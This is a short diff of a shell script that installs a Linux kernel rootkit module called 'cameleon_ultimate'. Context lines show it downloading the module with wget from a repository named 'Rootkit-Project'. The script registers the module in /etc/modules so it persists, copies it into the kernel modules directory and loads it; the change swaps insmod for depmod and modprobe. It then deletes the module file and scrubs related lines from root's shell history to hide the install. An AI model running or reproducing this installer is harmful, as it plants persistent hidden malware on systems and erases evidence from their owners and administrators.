@@ -4,7 +4,8 @@ wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmod
 echo "cameleon_ultimate" >> /etc/modules
 mkdir -p /lib/modules/$(uname -r)/extra
 cp cameleon_ultimate.ko /lib/modules/$(uname -r)/extra/
-insmod cameleon_ultimate.ko
+depmod -a
+modprobe cameleon_ultimate
 rm cameleon_ultimate.ko
 sed -i '/cameleon_ultimate/d' /root/.ash_history
 sed -i '/insertion/d' /root/.ash_history
